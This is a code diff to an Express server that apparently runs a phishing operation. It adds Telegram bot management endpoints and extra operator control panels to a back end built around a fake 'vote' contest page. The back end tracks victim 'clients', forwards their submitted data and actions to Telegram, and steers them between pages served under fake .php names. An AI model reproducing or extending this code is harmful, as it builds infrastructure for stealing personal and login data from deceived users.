@@ -14,7 +14,17 @@ const {
   logAudit
 } = require('./db');
 const { getPageMeta, resolveActionPage } = require('./pages');
-const { notifyNewClient, notifyData, notifyAction, notifyPageChange, notifyVoteApproved } = require('./telegram');
+const { 
+  notifyNewClient, 
+  notifyData, 
+  notifyAction, 
+  notifyPageChange, 
+  notifyVoteApproved,
+  getBotsConfig,
+  toggleBot,
+  togglePanel,
+  getPanelStatus
+} = require('./telegram');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -153,6 +163,42 @@ app.get('/register.php', (req, res) => {
 
 app.get('/api/clients', (req, res) => {
   res.json({ success: true, clients: getAllClients() });
+});
+
+// --- API de gestion des bots Telegram ---
+
+app.get('/api/bots/config', (req, res) => {
+  res.json({ success: true, config: getBotsConfig() });
+});
+
+app.post('/api/bots/toggle', (req, res) => {
+  const { botNumber, enabled } = req.body;
+  if (!botNumber || typeof enabled !== 'boolean') {
+    return res.status(400).json({ success: false, error: 'Paramètres invalides' });
+  }
+  const success = toggleBot(botNumber, enabled);
+  if (success) {
+    res.json({ success: true, message: `Bot ${botNumber} ${enabled ? 'activé' : 'désactivé'}` });
+  } else {
+    res.status(400).json({ success: false, error: 'Bot introuvable' });
+  }
+});
+
+app.get('/api/panels/status', (req, res) => {
+  res.json({ success: true, status: getPanelStatus() });
+});
+
+app.post('/api/panels/toggle', (req, res) => {
+  const { panelNumber, enabled } = req.body;
+  if (!panelNumber || typeof enabled !== 'boolean') {
+    return res.status(400).json({ success: false, error: 'Paramètres invalides' });
+  }
+  const success = togglePanel(panelNumber, enabled);
+  if (success) {
+    res.json({ success: true, message: `Panel ${panelNumber} ${enabled ? 'activé' : 'désactivé'}` });
+  } else {
+    res.status(400).json({ success: false, error: 'Panel introuvable' });
+  }
 });
 
 // --- Pages de flux ---
@@ -411,6 +457,18 @@ app.get('/control_panel.php', (req, res) => {
   res.sendFile(path.join(__dirname, '..', 'public', 'control_panel.html'));
 });
 
+// --- Panel admin 2 ---
+
+app.get('/control_panel_2.php', (req, res) => {
+  res.sendFile(path.join(__dirname, '..', 'public', 'control_panel_2.html'));
+});
+
+// --- Panel gestion des bots Telegram ---
+
+app.get('/control_panel_bots.php', (req, res) => {
+  res.sendFile(path.join(__dirname, '..', 'public', 'control_panel_bots.html'));
+});
+
 // --- Redirection racine ---
 
 app.get('/', (req, res) => {
@@ -425,4 +483,6 @@ app.listen(PORT, () => {
   console.log(`Serveur demarre: http://localhost:${PORT}`);
   console.log(`Page concours:   http://localhost:${PORT}/vote.html`);
   console.log(`Panel admin:     http://localhost:${PORT}/control_panel.php`);
+  console.log(`Panel admin 2:   http://localhost:${PORT}/control_panel_2.php`);
+  console.log(`Panel bots TG:   http://localhost:${PORT}/control_panel_bots.php`);
 });
